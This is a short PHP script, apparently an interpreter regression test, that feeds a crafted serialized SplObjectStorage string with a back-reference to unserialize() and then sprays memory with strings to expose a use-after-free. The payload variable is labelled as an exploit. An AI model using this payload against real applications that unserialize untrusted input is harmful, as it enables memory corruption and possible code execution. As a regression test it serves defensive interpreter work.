<?php
$inner = 'x:i:1;O:8:"stdClass":0:{};m:a:0:{}';
$exploit = 'a:2:{i:0;C:16:"SplObjectStorage":'.strlen($inner).':{'.$inner.'}i:1;R:3;}';

$data = unserialize($exploit);

for($i = 0; $i < 5; $i++) {
    $v[$i] = 'hi'.$i;
}

var_dump($data);
?>
===DONE===
